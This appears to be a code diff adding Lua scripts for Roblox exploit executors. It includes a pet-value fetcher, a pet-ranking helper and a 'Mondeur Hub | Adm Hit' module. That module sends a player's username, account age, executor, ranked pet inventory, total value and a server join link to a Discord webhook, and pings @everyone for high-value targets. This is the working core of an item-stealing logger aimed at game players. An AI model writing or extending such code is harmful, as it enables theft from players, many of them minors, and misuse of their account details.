@@ -1,0 +1,138 @@
+local HttpService = game:GetService("HttpService")
+
+local VALUE_URL = "YOUR_GITHUB_RAW_OR_API_LINK"
+
+local function fetchValues()
+    local success, res = pcall(function()
+        return request({
+            Url = VALUE_URL,
+            Method = "GET"
+        })
+    end)
+
+    if success and res and res.StatusCode == 200 then
+        local decoded = HttpService:JSONDecode(res.Body)
+        return decoded
+    else
+        warn("❌ Failed to fetch values")
+        return {}
+    end
+end
+
+return fetchValues
+local function processPets(pets, values)
+    local map = {}
+    local total = 0
+
+    for _, p in ipairs(pets) do
+        local name = p.name
+        local val = values[name:lower()] or 0
+
+        if not map[name] then
+            map[name] = {
+                name = name,
+                count = 0,
+                value = val,
+                rarity = p.rarity or "common",
+                neon = p.neon,
+                mega = p.mega,
+                fly = p.fly,
+                ride = p.ride
+            }
+        end
+
+        map[name].count += 1
+        total += val
+    end
+
+    local list = {}
+    for _, v in pairs(map) do table.insert(list, v) end
+
+    table.sort(list, function(a,b)
+        return a.value > b.value
+    end)
+
+    return list, total
+end
+
+return processPets
+local HttpService = game:GetService("HttpService")
+
+local cfg = getgenv().MondeurConfig or {}
+local webhook = cfg.Webhook or ""
+local threshold = tonumber(cfg.Threshold) or 0
+
+local req =
+    (syn and syn.request) or
+    (http and http.request) or
+    (http_request) or
+    (request)
+
+if not req then
+    warn("❌ No request function")
+    return
+end
+
+local function sendWebhook(player, pets, totalValue, joinLink)
+
+    local function getEmoji(p)
+        local e = ""
+        if p.mega then e ..= "🌈 " elseif p.neon then e ..= "🟣 " end
+        if p.fly then e ..= "🪽 " end
+        if p.ride then e ..= "🏇 " end
+        return e
+    end
+
+    local lines = {}
+    for i, p in ipairs(pets) do
+        if i > 12 then break end
+        table.insert(lines,
+            string.format("%s%s x%d", getEmoji(p), p.name, p.count)
+        )
+    end
+
+    local content = (totalValue >= threshold) and "@everyone" or ""
+
+    local data = {
+        content = content,
+        embeds = {{
+            title = "🦊 Mondeur Hub | Adm Hit",
+
+            description =
+                "```" ..
+                "👤 Display Name : " .. player.displayName .. "\n" ..
+                "🆔 Username     : " .. player.username .. "\n" ..
+                "📅 Account Age  : " .. player.accountAge .. " days\n" ..
+                "📱 Executor     : " .. player.executor .. "\n" ..
+                "👥 Players      : " .. player.players .. "\n" ..
+                "💰 Total Value  : " .. totalValue ..
+                "```",
+
+            fields = {
+                {
+                    name = "🐶 Pets (Best → Worst)",
+                    value = "```" .. table.concat(lines, "\n") .. "```"
+                },
+                {
+                    name = "🌐 Join",
+                    value = "[Click to Join](" .. joinLink .. ")"
+                }
+            },
+
+            footer = {text = "Mondeuronbotton"}
+        }}
+    }
+
+    task.spawn(function()
+        pcall(function()
+            req({
+                Url = webhook,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode(data)
+            })
+        end)
+    end)
+end
+
+return sendWebhook
